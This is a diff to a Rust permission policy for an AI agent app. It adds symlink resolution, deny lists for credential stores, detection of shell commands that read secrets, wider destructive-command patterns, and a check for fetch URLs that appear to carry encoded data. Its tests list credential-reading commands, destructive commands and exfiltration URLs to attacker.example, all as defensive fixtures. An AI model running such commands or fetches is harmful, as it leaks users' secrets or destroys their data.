@@ -2,6 +2,7 @@
 use regex::Regex;
 use serde::Serialize;
 use serde_json::Value;
+use std::ffi::OsString;
 use std::path::{Path, PathBuf};
 
 #[derive(Serialize, Clone, Debug, PartialEq)]
@@ -46,13 +47,77 @@ fn norm(p: &str) -> PathBuf {
     clean
 }
 
+/// Canonicalize the longest existing prefix and re-append the rest. Comparing the real target means
+/// a symlink cannot move a path out of (or into) the workspace, while a file that does not exist yet
+/// still resolves through the nearest existing parent.
+fn resolved(p: &Path) -> PathBuf {
+    let mut existing = p.to_path_buf();
+    let mut rest: Vec<OsString> = Vec::new();
+    loop {
+        if let Ok(real) = existing.canonicalize() {
+            // `canonicalize` returns a verbatim path on Windows: `\\?\C:\..` or `\\?\UNC\server\share`.
+            let real = real.to_string_lossy();
+            let real = match real.strip_prefix(r"\\?\UNC\") {
+                Some(rest) => format!(r"\\{rest}"),
+                None => real.to_string(),
+            };
+            let mut out = norm(&real);
+            for part in rest.iter().rev() {
+                out.push(part);
+            }
+            return out;
+        }
+        let (Some(name), Some(parent)) = (existing.file_name(), existing.parent()) else { break };
+        if parent.as_os_str().is_empty() || parent == existing.as_path() { break; }
+        rest.push(name.to_os_string());
+        existing = parent.to_path_buf();
+    }
+    p.to_path_buf()
+}
+
 fn inside(path: &Path, root: &Path) -> bool {
     // Linux paths are case-sensitive, so only Windows folds case.
     let fold = |s: &str| if cfg!(windows) { s.to_lowercase() } else { s.to_string() };
-    let a = fold(&path.to_string_lossy());
-    let b = fold(&root.to_string_lossy());
+    let a = fold(&resolved(path).to_string_lossy());
+    let b = fold(&resolved(root).to_string_lossy());
     let b = if b.len() > 1 { b.trim_end_matches(SEP) } else { b.as_str() };
     a == b || a.starts_with(&format!("{b}{SEP}"))
+}
+
+/// Credential stores, keyrings and browser profiles. A single read discloses a secret that cannot be
+/// recalled, so these are refused in every mode, on both separators and on both platforms.
+const SECRET_DIRS: &[&str] = &[
+    "/.ssh", "/.aws", "/.gnupg", "/.password-store", "/.pki", "/.kube", "/.docker/config.json",
+    "/.local/share/keyrings", "/.gnome2/keyrings", "/.local/share/kwalletd", "/.config/kwalletd",
+    "/.config/gh", "/.config/gcloud", "/.config/hub",
+    "/.mozilla/firefox", "/.config/google-chrome", "/.config/chromium", "/.config/brave-browser",
+    "/.config/microsoft-edge", "/.config/vivaldi", "/.config/opera", "/.thunderbird",
+    // Windows: browser profiles, the credential store and the keys that protect it.
+    "/google/chrome/user data", "/microsoft/edge/user data", "/brave-browser/user data",
+    "/mozilla/firefox/profiles", "/microsoft/credentials", "/microsoft/protect", "/microsoft/crypto",
+    // macOS.
+    "/library/keychains", "/library/application support/google/chrome", "/library/application support/firefox",
+];
+
+/// Individual files that hold credentials wherever they are found. `.env` files are added below for
+/// paths outside the workspace only: a project's own environment file stays ordinary work.
+const SECRET_FILES: &[&str] = &[
+    ".git-credentials", ".netrc", "_netrc", ".pgpass", "id_rsa", "id_ed25519", "id_ecdsa", "id_dsa",
+    "login.keychain-db", "login.keychain",
+];
+
+fn secret_location(path: &Path, workspace: &Path) -> bool {
+    let p = resolved(path);
+    let s = p.to_string_lossy().replace('\\', "/").to_lowercase();
+    let s = s.trim_end_matches('/');
+    let in_dir = |d: &str| s == d || s.ends_with(d) || s.starts_with(&format!("{d}/")) || s.contains(&format!("{d}/"));
+    if SECRET_DIRS.iter().any(|d| in_dir(d)) {
+        return true;
+    }
+    let name = s.rsplit('/').next().unwrap_or("");
+    let env_file = name == ".env" || name.starts_with(".env.") || name.ends_with(".env");
+    let secret_file = SECRET_FILES.contains(&name) || name.ends_with(".kdbx");
+    (env_file || secret_file) && !inside(&p, workspace)
 }
 
 fn resolve_arg_path(s: &str, workspace: &Path) -> PathBuf {
@@ -141,13 +206,19 @@ const SEND: &str = "Send data to another computer";
 const PRIVILEGE: &str = "Run a command as administrator";
 const AUTORUN: &str = "Change a file or setting that runs code automatically";
 const HIDDEN: &str = "Run an encoded command that cannot be checked";
-const ALWAYS_ASK: &[&str] = &[PUBLISH, SEND, PRIVILEGE, AUTORUN, HIDDEN];
+/// Reading or writing outside the folder this chat works in.
+const OUTSIDE: &str = "Work outside the workspace";
+/// A link whose query string or long path segment looks like encoded data: the usual shape of a
+/// fetch that carries file contents off this computer.
+const EXFIL: &str = "Fetch a web address that appears to carry data";
+const ALWAYS_ASK: &[&str] = &[PUBLISH, SEND, PRIVILEGE, AUTORUN, HIDDEN, OUTSIDE, EXFIL];
 const RUN_COMMAND: &str = "Run a command on your computer";
 
 /// Automatic mode runs without prompts. It still stops for things that cannot be taken back:
 /// destructive shell commands, publishing or sending data elsewhere, admin rights, code set to run
-/// automatically, entering a password or payment detail on a website, and online purchases.
-/// Protected locations (Windows, Program Files, the app's own data) stay denied in every mode.
+/// automatically, leaving the workspace, entering a password or payment detail on a website, and
+/// online purchases. Protected locations (Windows, Program Files, the app's own data) and credential
+/// stores stay denied in every mode.
 pub fn decide(tool: &str, category: &str, args: &Value, workspace: &Path, auto_edit: bool, remembered: &[String]) -> Decision {
     match guarded(tool, category, args, workspace, auto_edit, remembered) {
         Decision::Ask { class, reason, can_remember } if !auto_edit || class == Class::Destructive || ALWAYS_ASK.contains(&reason.as_str()) || reason.contains("password or payment") || reason.contains("purchase") => {
@@ -167,31 +238,31 @@ fn guarded(tool: &str, category: &str, args: &Value, workspace: &Path, auto_edit
     let paths = arg_paths(tool, args, workspace);
     let data = data_dir_lower();
     for p in &paths {
-        let l = p.to_string_lossy().to_lowercase();
-        if PROTECTED.iter().any(|x| l == *x || l.starts_with(&format!("{x}{SEP}")))
-            || l.contains("\\appdata\\local\\workbench\\")
-            || l.ends_with("\\appdata\\local\\workbench")
-            || data.as_ref().is_some_and(|d| l == *d || l.starts_with(&format!("{d}{SEP}")))
-        {
+        let raw = p.to_string_lossy().to_lowercase();
+        let real = resolved(p).to_string_lossy().to_lowercase();
+        if protected(&raw, data.as_deref()) || protected(&real, data.as_deref()) {
             return Decision::Deny(format!("{} is a protected location", p.display()));
+        }
+        if secret_location(p, workspace) {
+            return Decision::Deny(format!("{} holds credentials, so it is never read or changed", p.display()));
         }
     }
     let outside = paths.iter().any(|p| !inside(p, workspace));
-    let remembered_hit = remembered.iter().any(|t| t == tool);
+    let remembered_hit = remembered_ok(tool, &paths, workspace, remembered);
     if category == "edit" && paths.iter().any(|p| autorun_path(&p.to_string_lossy())) {
         return Decision::Ask { class: Class::Write, reason: AUTORUN.into(), can_remember: false };
     }
     match category {
         "info" => {
-            if outside {
-                Decision::Ask { class: Class::Read, reason: "Read outside the workspace".into(), can_remember: false }
+            if outside && !remembered_hit {
+                Decision::Ask { class: Class::Read, reason: OUTSIDE.into(), can_remember: true }
             } else {
                 Decision::Allow
             }
         }
         "edit" => {
-            if outside {
-                Decision::Ask { class: Class::Write, reason: "Write outside the workspace".into(), can_remember: false }
+            if outside && !remembered_hit {
+                Decision::Ask { class: Class::Write, reason: OUTSIDE.into(), can_remember: true }
             } else if auto_edit || remembered_hit {
                 Decision::Allow
             } else {
@@ -203,18 +274,56 @@ fn guarded(tool: &str, category: &str, args: &Value, workspace: &Path, auto_edit
     }
 }
 
+/// Protected locations that are denied even when a path is spelled with `..` or reaches the folder
+/// through a symlink.
+fn protected(l: &str, data: Option<&str>) -> bool {
+    PROTECTED.iter().any(|x| l == *x || l.starts_with(&format!("{x}{SEP}")))
+        || l.contains("\\appdata\\local\\workbench\\")
+        || l.ends_with("\\appdata\\local\\workbench")
+        || data.is_some_and(|d| l == d || l.starts_with(&format!("{d}{SEP}")))
+}
+
 fn command_arg(args: &Value) -> &str {
     args.get("command").or_else(|| args.get("cmd")).and_then(|v| v.as_str()).unwrap_or("")
 }
 
 /// What "Allow for this chat" remembers: the exact command (whitespace collapsed) for shell commands,
-/// so approving one command never approves a different one; the tool name for file and document edits.
+/// so approving one command never approves a different one; for file tools the folder the approved
+/// path was in. A folder inside the workspace covers that tool for the chat, because the chat works in
+/// that folder; a folder outside it covers only that folder.
 pub fn remember_key(tool: &str, category: &str, args: &Value) -> String {
     if category == "exec" {
-        format!("exec:{}", command_arg(args).split_whitespace().collect::<Vec<_>>().join(" "))
-    } else {
-        tool.to_string()
+        return format!("exec:{}", command_arg(args).split_whitespace().collect::<Vec<_>>().join(" "));
     }
+    match arg_folder(args) {
+        Some(folder) => format!("{tool}@{folder}"),
+        None => tool.to_string(),
+    }
+}
+
+fn arg_folder(args: &Value) -> Option<String> {
+    for k in ["file_path", "path", "filePath", "output", "file", "target", "source", "dataset", "dataset_path", "actual_path"] {
+        let Some(s) = args.get(k).and_then(Value::as_str) else { continue };
+        let p = norm(s);
+        // A relative path can only be resolved against the workspace, which this function does not
+        // take; keep the older chat-wide key for it.
+        if !p.is_absolute() {
+            return None;
+        }
+        let folder = if p.is_dir() { p.clone() } else { p.parent().map(Path::to_path_buf).unwrap_or(p) };
+        return Some(folder.to_string_lossy().to_string());
+    }
+    None
+}
+
+fn remembered_ok(tool: &str, paths: &[PathBuf], workspace: &Path, remembered: &[String]) -> bool {
+    remembered.iter().any(|k| match k.split_once('@') {
+        None => k == tool,
+        Some((t, folder)) => {
+            t == tool
+                && (inside(Path::new(folder), workspace) || paths.iter().any(|p| inside(p, Path::new(folder))))
+        }
+    })
 }
 
 fn autorun_path(path: &str) -> bool {
@@ -417,8 +526,11 @@ fn exec_decision(args: &Value, workspace: &Path, auto_edit: bool, remembered: &[
         return Decision::Ask { class: Class::Exec, reason: "Run a command with an explicitly selected shell".into(), can_remember: false };
     }
     let cmd = command_arg(args);
+    if let Some(path) = command_secret(cmd, workspace) {
+        return Decision::Deny(format!("{path} holds credentials, so it is never read or changed"));
+    }
     let destructive = Regex::new(
-        r"(?i)(\brm\s+-[a-z]*[rf]|\bdel\b.*(/s|/q)|\brmdir\b|remove-item|\bformat\b\s+[a-z]:|\bshutdown\b|reg\s+delete|git\s+(push\s+.*--force|reset\s+--hard|clean\s+-[a-z]*f)|\bdiskpart\b|\bcipher\s+/w|\|\s*(sh|bash|iex)\b|invoke-expression|\bmkfs\b|\btaskkill\b)",
+        r"(?i)(\brm\s+-[a-z]*[rf]|\bdel\b.*(/s|/q)|\brd\b[^|&;<>]*/s|\berase\b[^|&;<>]*/s|\brmdir\b|remove-item|\bformat\b\s+[a-z]:|\bshutdown\b|reg\s+delete|git\s+(push\s+.*--force|reset\s+--hard|clean\s+-[a-z]*f)|git\s+checkout\s+(?:-{1,2}[a-z-]+\s+)*\.(?:\s|$)|git\s+restore\s+(?:-{1,2}[a-z-]+\s+)*\.(?:\s|$)|\bfind\b[^|&;<>]*\s-delete\b|\bshred\b|\bdiskpart\b|\bcipher\s+/w|\|\s*(sh|bash|iex)\b|invoke-expression|\bmkfs\b|\btaskkill\b)",
     )
     .unwrap();
     if destructive.is_match(cmd) {
@@ -485,6 +597,102 @@ fn unix_path_escapes(cmd: &str, workspace: &Path) -> bool {
     escapes
 }
 
+/// Every path-shaped word on a command line, with `~`, `$HOME` and `--option=value` expanded, so a
+/// shell command that reaches a credential store is seen even inside a wrapper.
+fn command_paths(cmd: &str, workspace: &Path) -> Vec<PathBuf> {
+    let home = std::env::var("HOME").or_else(|_| std::env::var("USERPROFILE")).unwrap_or_default();
+    let separators = |c: char| c.is_whitespace() || matches!(c, ';' | '|' | '&' | '(' | ')' | '<' | '>' | ',' | '=' | '\'' | '"' | '`');
+    let mut out = Vec::new();
+    for token in cmd.split(separators) {
+        let t = token.trim();
+        let lower = t.to_lowercase();
+        let pathish = t.contains('/') || t.contains('\\') || t.starts_with('~') || t.starts_with('$')
+            || lower.starts_with(".env") || lower.ends_with(".env");
+        if !pathish {
+            continue;
+        }
+        let expanded = if let Some(rest) = t.strip_prefix("${HOME}").or_else(|| t.strip_prefix("$HOME")) {
+            format!("{home}{rest}")
+        } else if let Some(rest) = t.strip_prefix('~') {
+            format!("{home}{rest}")
+        } else {
+            t.to_string()
+        };
+        out.push(resolve_arg_path(&expanded, workspace));
+    }
+    out
+}
+
+fn command_secret(cmd: &str, workspace: &Path) -> Option<String> {
+    command_paths(cmd, workspace).into_iter().find(|p| secret_location(p, workspace)).map(|p| p.display().to_string())
+}
+
+/// A URL the model asks to fetch, if the tool call carries one.
+fn fetch_urls(args: &Value) -> Vec<&str> {
+    let mut urls = Vec::new();
+    for k in ["url", "uri", "href", "target", "args"] {
+        match args.get(k) {
+            Some(Value::Array(a)) => urls.extend(a.iter().filter_map(Value::as_str).filter(|s| s.contains("://"))),
+            Some(Value::String(s)) if s.contains("://") => urls.push(s.as_str()),
+            _ => {}
+        }
+    }
+    urls
+}
+
+/// Long runs that look like base64 or hex of binary data rather than a readable id or phrase.
+/// Ordinary text keeps long runs of lower-case letters, encoded bytes do not.
+fn encoded_blob(run: &str) -> bool {
+    let bytes = run.as_bytes();
+    if bytes.len() < 28 || !bytes.iter().all(|c| c.is_ascii_alphanumeric() || matches!(c, b'+' | b'/' | b'=')) {
+        return false;
+    }
+    if bytes.len() >= 32 && bytes.iter().all(u8::is_ascii_hexdigit) && bytes.iter().any(u8::is_ascii_digit) {
+        return true;
+    }
+    let digits_upper = bytes.iter().filter(|c| c.is_ascii_digit() || c.is_ascii_uppercase()).count();
+    let lowercase = bytes.iter().filter(|c| c.is_ascii_lowercase()).count();
+    let word = bytes.windows(5).any(|w| w.iter().all(u8::is_ascii_lowercase));
+    digits_upper * 5 >= bytes.len() && lowercase * 5 >= bytes.len() && !word
+}
+
+/// Percent escapes that decode to something other than printable ASCII: the shape of raw bytes in a
+/// query string, where an escaped space (`%20`) is ordinary.
+fn opaque_escapes(s: &str) -> usize {
+    let b = s.as_bytes();
+    let (mut n, mut i) = (0, 0);
+    while i + 2 < b.len() {
+        if b[i] == b'%' {
+            let hex = std::str::from_utf8(&b[i + 1..i + 3]).ok().and_then(|h| u8::from_str_radix(h, 16).ok());
+            if let Some(byte) = hex {
+                if !(0x20..0x7f).contains(&byte) {
+                    n += 1;
+                }
+                i += 3;
+                continue;
+            }
+        }
+        i += 1;
+    }
+    n
+}
+
+/// True when a fetch link looks like a carrier: an encoded query value, a query that is mostly opaque
+/// escapes, or a long encoded path segment. Knowing which domains a chat already fetched would need
+/// per-chat state outside this pure decision, so the shape of the URL carries the check.
+fn url_carries_data(url: &str) -> bool {
+    let rest = url.split_once("://").map(|(_, r)| r).unwrap_or(url);
+    let (path, query) = match rest.split_once('?') {
+        Some((p, q)) => (p, q.split('#').next().unwrap_or("")),
+        None => (rest.split('#').next().unwrap_or(""), ""),
+    };
+    let blobs = |s: &str| s.split(|c: char| !(c.is_ascii_alphanumeric() || matches!(c, '+' | '/' | '='))).any(encoded_blob);
+    if !query.is_empty() && (blobs(query) || opaque_escapes(query) >= 4) {
+        return true;
+    }
+    path.split('/').any(|seg| seg.len() >= 40 && blobs(seg))
+}
+
 fn mcp_decision(tool: &str, args: &Value, auto_edit: bool, remembered: bool, outside: bool, has_path: bool) -> Decision {
     let t = tool.to_lowercase();
     let read_verbs = ["view", "get", "query", "list", "validate", "verify", "info", "help", "inspect", "read", "page_count"];
@@ -513,13 +721,21 @@ fn mcp_decision(tool: &str, args: &Value, auto_edit: bool, remembered: bool, out
     if t.ends_with("tabular") && !outside {
         return Decision::Allow;
     }
+    if t.contains("web_fetch") {
+        // Once page content is in the chat, a second fetch can carry it off the computer in its query
+        // string. A link shaped like a data carrier always asks, in every mode.
+        if fetch_urls(args).iter().any(|u| url_carries_data(u)) {
+            return Decision::Ask { class: Class::Exec, reason: EXFIL.into(), can_remember: false };
+        }
+        return Decision::Allow;
+    }
     if t.contains("officecli") {
         let writes_output = officecli_writes_output(tool, args);
         let is_read = read_verbs.iter().any(|v| first == *v) && !writes_output;
         let fileless = matches!(first.as_str(), "help" | "version" | "--help" | "--version" | "-h" | "-v")
             || args.get("args").and_then(Value::as_array).is_some_and(|a| a.iter().any(|v| matches!(v.as_str(), Some("--help" | "-h" | "--version" | "-v"))));
-        if outside {
-            return Decision::Ask { class: if is_read { Class::Read } else { Class::Write }, reason: if is_read { "Read outside the workspace" } else { "Document change outside the workspace" }.into(), can_remember: false };
+        if outside && !remembered {
+            return Decision::Ask { class: if is_read { Class::Read } else { Class::Write }, reason: OUTSIDE.into(), can_remember: true };
         }
         if officecli_uncertain_path_option(tool, args) {
             return Decision::Ask { class: Class::Write, reason: "OfficeCLI command uses an unrecognized path option".into(), can_remember: false };
@@ -532,11 +748,11 @@ fn mcp_decision(tool: &str, args: &Value, auto_edit: bool, remembered: bool, out
         }
         return if auto_edit || remembered { Decision::Allow } else { Decision::Ask { class: Class::Write, reason: "Create or change an Office document".into(), can_remember: true } };
     }
-    if t.contains("workspace_info") || t.contains("load_skill") || t.contains("read_attachment") || t.contains("show_chart") || t.contains("show_table") || t.contains("show_diagram") || t.contains("publish_artifact") || t.contains("update_plan") || t.contains("ask_user") || t.contains("web_search") || t.contains("memory_") || t.contains("web_fetch") || read_verbs.iter().any(|v| first == *v) {
+    if t.contains("workspace_info") || t.contains("load_skill") || t.contains("read_attachment") || t.contains("show_chart") || t.contains("show_table") || t.contains("show_diagram") || t.contains("publish_artifact") || t.contains("update_plan") || t.contains("ask_user") || t.contains("web_search") || read_verbs.iter().any(|v| first == *v) {
         return Decision::Allow;
     }
-    if outside {
-        return Decision::Ask { class: Class::Write, reason: "Document change outside the workspace".into(), can_remember: false };
+    if outside && !remembered {
+        return Decision::Ask { class: Class::Write, reason: OUTSIDE.into(), can_remember: true };
     }
     if auto_edit || remembered {
         Decision::Allow
@@ -602,13 +818,180 @@ mod unix_tests {
     #[test]
     fn linux_commands_outside_the_workspace_need_a_step_by_step_approval() {
         let ws = Path::new("/home/me/projects/draft");
-        for cmd in ["cat /home/me/.ssh/id_ed25519", "cp a.md ~/out.md", "yay -S foo"] {
+        for cmd in ["cat /home/me/notes.md", "cp a.md ~/out.md", "yay -S foo"] {
             assert!(matches!(guarded("ExecCommand", "exec", &json!({"cmd": cmd}), ws, true, &[]), Decision::Ask { .. }), "{cmd}");
         }
         assert!(matches!(decide("ExecCommand", "exec", &json!({"cmd": "sudo pacman -S foo"}), ws, true, &[]), Decision::Ask { .. }));
         for cmd in ["python3 build.py", "grep -r todo . > /dev/null", "cat /home/me/projects/draft/a.md"] {
             assert!(matches!(decide("ExecCommand", "exec", &json!({"cmd": cmd}), ws, true, &[]), Decision::Allow), "{cmd}");
         }
+    }
+
+    #[test]
+    fn automatic_mode_asks_before_working_outside_the_workspace() {
+        let ws = Path::new("/home/me/projects/draft");
+        for (tool, cat) in [("read_file", "info"), ("list_dir", "info"), ("write_file", "edit")] {
+            let args = json!({"path": "/home/me/notes.md"});
+            let d = decide(tool, cat, &args, ws, true, &[]);
+            assert!(matches!(d, Decision::Ask { ref reason, can_remember: true, .. } if reason == OUTSIDE), "{tool}: {d:?}");
+        }
+        // Ordinary work in the folder still runs without a prompt.
+        for (tool, cat, args) in [
+            ("read_file", "info", json!({"path": "a.md"})),
+            ("read_file", "info", json!({"path": "/home/me/projects/draft/a.md"})),
+            ("write_file", "edit", json!({"path": "/home/me/projects/draft/sub/b.md"})),
+        ] {
+            assert!(matches!(decide(tool, cat, &args, ws, true, &[]), Decision::Allow), "{tool} {args}");
+        }
+        assert!(matches!(decide("ExecCommand", "exec", &json!({"cmd": "python3 build.py"}), ws, true, &[]), Decision::Allow));
+    }
+
+    #[test]
+    fn an_outside_approval_is_remembered_for_that_folder_only() {
+        let ws = Path::new("/home/me/projects/draft");
+        let notes = json!({"path": "/home/me/Documents/notes.md"});
+        assert_eq!(remember_key("read_file", "info", &notes), "read_file@/home/me/Documents");
+        let remembered = [remember_key("read_file", "info", &notes)];
+        for (path, allowed) in [
+            ("/home/me/Documents/other.md", true),
+            ("/home/me/Documents/sub/deep.md", true),
+            ("/home/me/Downloads/other.md", false),
+            ("/home/me/Documents.md", false),
+        ] {
+            let d = decide("read_file", "info", &json!({"path": path}), ws, true, &remembered);
+            assert_eq!(matches!(d, Decision::Allow), allowed, "{path}: {d:?}");
+        }
+        // The remembered folder does not unlock another tool.
+        assert!(matches!(decide("write_file", "edit", &json!({"path": "/home/me/Documents/x.md"}), ws, true, &remembered), Decision::Ask { .. }));
+        // Edits inside the workspace keep their chat-wide approval.
+        let key = remember_key("write_file", "edit", &json!({"path": "b.md"}));
+        assert_eq!(key, "write_file");
+        assert!(matches!(decide("write_file", "edit", &json!({"path": "sub/c.md"}), ws, false, &[key]), Decision::Allow));
+    }
+
+    #[test]
+    fn credential_locations_are_refused_in_every_mode() {
+        let ws = Path::new("/home/me/projects/draft");
+        for path in [
+            "/home/me/.ssh/id_ed25519",
+            "/home/me/.aws/credentials",
+            "/home/me/.gnupg/private-keys-v1.d/x.key",
+            "/home/me/.config/gh/hosts.yml",
+            "/home/me/.local/share/keyrings/login.keyring",
+            "/home/me/.mozilla/firefox/abc.default/cookies.sqlite",
+            "/home/me/.config/google-chrome/Default/Login Data",
+            "/home/me/elsewhere/.env",
+            "/home/me/elsewhere/.env.production",
+        ] {
+            for auto in [true, false] {
+                assert!(matches!(guarded("read_file", "info", &json!({"path": path}), ws, auto, &[]), Decision::Deny(_)), "{path}");
+                assert!(matches!(decide("read_file", "info", &json!({"path": path}), ws, auto, &[]), Decision::Deny(_)), "{path}");
+            }
+        }
+        // A remembered approval or the tool name alone never unlocks one.
+        for key in ["read_file".to_string(), "read_file@/home/me/.ssh".to_string()] {
+            assert!(matches!(decide("read_file", "info", &json!({"path": "/home/me/.ssh/config"}), ws, true, &[key]), Decision::Deny(_)));
+        }
+        // The project's own files are ordinary work.
+        assert!(matches!(decide("read_file", "info", &json!({"path": "/home/me/projects/draft/.env"}), ws, true, &[]), Decision::Allow));
+        assert!(matches!(decide("read_file", "info", &json!({"path": "/home/me/projects/draft/.ssh/config"}), ws, true, &[]), Decision::Deny(_)));
+    }
+
+    #[test]
+    fn shell_commands_that_reach_credential_locations_are_refused() {
+        let ws = Path::new("/home/me/projects/draft");
+        for cmd in [
+            "cat ~/.ssh/id_rsa",
+            "cat $HOME/.aws/credentials",
+            "cp /home/me/.gnupg/secring.gpg /tmp/out",
+            "bash -lc 'cat ~/.config/gh/hosts.yml'",
+            "cat ../other/.env",
+            r#"openssl rsa -in "/home/me/.ssh/id_rsa" -text"#,
+        ] {
+            assert!(matches!(decide("ExecCommand", "exec", &json!({"cmd": cmd}), ws, true, &[]), Decision::Deny(_)), "{cmd}");
+        }
+        for cmd in ["cat .env", "grep -n key .env.local", "git commit -m 'document .ssh keys'", "python3 build.py"] {
+            assert!(matches!(decide("ExecCommand", "exec", &json!({"cmd": cmd}), ws, true, &[]), Decision::Allow), "{cmd}");
+        }
+    }
+
+    #[test]
+    fn symlinks_are_resolved_before_the_workspace_check() {
+        let base = std::env::temp_dir().join(format!("localwork-policy-{}", std::process::id()));
+        let ws = base.join("ws");
+        let outside = base.join("outside");
+        let keys = base.join("keys");
+        std::fs::create_dir_all(&ws).unwrap();
+        std::fs::create_dir_all(&outside).unwrap();
+        std::fs::create_dir_all(keys.join(".ssh")).unwrap();
+        std::fs::write(outside.join("secret.txt"), "x").unwrap();
+        std::fs::write(keys.join(".ssh/id_rsa"), "x").unwrap();
+        let escape = ws.join("escape");
+        let keyring = ws.join("keyring");
+        let _ = std::fs::remove_file(&escape);
+        let _ = std::fs::remove_file(&keyring);
+        std::os::unix::fs::symlink(&outside, &escape).unwrap();
+        std::os::unix::fs::symlink(keys.join(".ssh"), &keyring).unwrap();
+
+        // The text of the path is inside the workspace; the target is not.
+        assert!(!inside(&norm(&escape.join("secret.txt").to_string_lossy()), &norm(&ws.to_string_lossy())));
+        let read = json!({"path": escape.join("secret.txt").to_string_lossy()});
+        assert!(matches!(decide("read_file", "info", &read, &ws, true, &[]), Decision::Ask { reason, .. } if reason == OUTSIDE), "{read}");
+        // A symlink into a credential store is denied, not merely outside.
+        let key = json!({"path": keyring.join("id_rsa").to_string_lossy()});
+        assert!(matches!(decide("read_file", "info", &key, &ws, true, &[]), Decision::Deny(_)), "{key}");
+        // A new file that does not exist yet still resolves through its existing parent.
+        assert!(inside(&norm(&ws.join("new/file.txt").to_string_lossy()), &norm(&ws.to_string_lossy())));
+        std::fs::remove_file(ws.join("escape")).unwrap();
+        std::fs::remove_file(ws.join("keyring")).unwrap();
+        let _ = std::fs::remove_dir_all(&base);
+    }
+
+    #[test]
+    fn destructive_commands_ask_in_automatic_mode() {
+        let ws = Path::new("/home/me/projects/draft");
+        for cmd in [
+            "rm -rf build",
+            "rd /s /q build",
+            "erase /s /q *.log",
+            "find . -name '*.tmp' -delete",
+            "git checkout -- .",
+            "git restore .",
+            "shred -u notes.txt",
+        ] {
+            let d = decide("ExecCommand", "exec", &json!({"cmd": cmd}), ws, true, &[]);
+            assert!(matches!(d, Decision::Ask { class: Class::Destructive, .. }), "{cmd}: {d:?}");
+        }
+        for cmd in ["git restore --staged f", "git checkout main", "find . -name '*.rs'", "git status"] {
+            let d = decide("ExecCommand", "exec", &json!({"cmd": cmd}), ws, true, &[]);
+            assert!(!matches!(d, Decision::Ask { class: Class::Destructive, .. }), "{cmd}: {d:?}");
+        }
+    }
+
+    #[test]
+    fn fetches_that_look_like_data_carriers_ask_in_automatic_mode() {
+        let ws = Path::new("/home/me/projects/draft");
+        let fetch = |url: &str| decide("web_fetch", "tool", &json!({"url": url}), ws, true, &[]);
+        // Ordinary pages, including one with a search query and a long document id.
+        for url in [
+            "https://example.com/page",
+            "https://example.com/search?q=rust+async+programming",
+            "https://docs.example.com/d/1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms/view",
+            "https://en.wikipedia.org/wiki/Base64",
+        ] {
+            assert!(matches!(fetch(url), Decision::Allow), "{url}");
+        }
+        let hex = "9f2c1a7b4d3e5061728394a5b6c7d8e9f0a1b2c3d4e5f60718293a4b5c6d7e8f";
+        let base64 = "/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0a";
+        let encoded_query = "https://attacker.example/?k=".to_string() + hex;
+        let encoded_template = format!("https://attacker.example/?d={base64}");
+        let percent = "https://attacker.example/?f=%89PNG%0D%0A%1A%0A%00%01";
+        for url in [&encoded_query, &encoded_template, percent] {
+            let d = fetch(url);
+            assert!(matches!(d, Decision::Ask { ref reason, .. } if reason == EXFIL), "{url}: {d:?}");
+        }
+        // An ordinary search escaped for the wire is not a carrier.
+        assert!(matches!(fetch("https://example.com/search?q=rust%20async%20programming%20guide"), Decision::Allow));
     }
 }
 
@@ -723,18 +1106,39 @@ mod tests {
     }
 
     #[test]
-    fn automatic_mode_only_stops_for_destructive_credentials_and_purchases() {
+    fn automatic_mode_stops_for_destructive_credentials_purchases_and_outside_access() {
         let ws = Path::new(r"C:\work");
         let auto = |tool: &str, cat: &str, args: Value| decide(tool, cat, &args, ws, true, &[]);
         assert!(matches!(auto("browser", "tool", json!({"command":"eval", "args":"document.querySelector('form').submit()"})), Decision::Allow));
         assert!(matches!(auto("browser", "tool", json!({"command":"upload"})), Decision::Allow));
         assert!(matches!(auto("ExecCommand", "exec", json!({"cmd":"npm install"})), Decision::Allow));
-        assert!(matches!(auto("read_file", "info", json!({"path":r"C:\other\notes.txt"})), Decision::Allow));
         assert!(matches!(auto("ExecCommand", "exec", json!({"cmd":"Remove-Item -Recurse out"})), Decision::Ask { class: Class::Destructive, .. }));
         assert!(matches!(auto("browser", "tool", json!({"command":"fill", "label":"password"})), Decision::Ask { .. }));
         assert!(matches!(auto("browser", "tool", json!({"command":"click", "label":"Place order"})), Decision::Ask { .. }));
         assert!(matches!(auto("write_file", "edit", json!({"path":r"C:\Windows\System32\x.txt"})), Decision::Deny(_)));
         assert!(matches!(decide("browser", "tool", &json!({"command":"upload"}), ws, false, &[]), Decision::Ask { .. }));
+        // Outside the folder is no longer part of "routine": it asks in Automatic mode too, and an
+        // approval can be remembered for that folder.
+        assert!(matches!(auto("read_file", "info", json!({"path": r"C:\other\notes.txt"})), Decision::Ask { class: Class::Read, can_remember: true, .. }));
+        assert!(matches!(auto("read_file", "info", json!({"path": r"C:\work\notes.txt"})), Decision::Allow));
+        let remembered = [remember_key("read_file", "info", &json!({"path": r"C:\other\notes.txt"}))];
+        assert!(matches!(decide("read_file", "info", &json!({"path": r"C:\other\again.txt"}), ws, true, &remembered), Decision::Allow));
+        assert!(matches!(decide("read_file", "info", &json!({"path": r"C:\elsewhere\again.txt"}), ws, true, &remembered), Decision::Ask { .. }));
+        for path in [r"C:\Users\Me\.ssh\id_rsa", r"C:\Users\Me\.aws\credentials", r"C:\Users\Me\.gnupg\pubring.kbx"] {
+            assert!(matches!(decide("read_file", "info", &json!({"path": path}), ws, true, &["read_file".to_string()]), Decision::Deny(_)), "{path}");
+        }
+    }
+
+    #[test]
+    fn new_destructive_patterns_and_credential_paths_are_caught_in_automatic_mode() {
+        let ws = Path::new(r"C:\work");
+        let auto = |cmd: &str| decide("ExecCommand", "exec", &json!({"cmd": cmd}), ws, true, &[]);
+        for cmd in [r"rd /s /q build", r"erase /s /q *.log", "find . -name *.tmp -delete", "git checkout -- .", "git restore .", "shred notes.txt"] {
+            assert!(matches!(auto(cmd), Decision::Ask { class: Class::Destructive, .. }), "{cmd}");
+        }
+        for cmd in [r"type C:\Users\Me\.ssh\id_rsa", r"Get-Content C:\Users\Me\.config\gh\hosts.yml", r"cmd /c type %USERPROFILE%\.aws\credentials"] {
+            assert!(matches!(auto(cmd), Decision::Deny(_)), "{cmd}");
+        }
     }
 
     #[test]
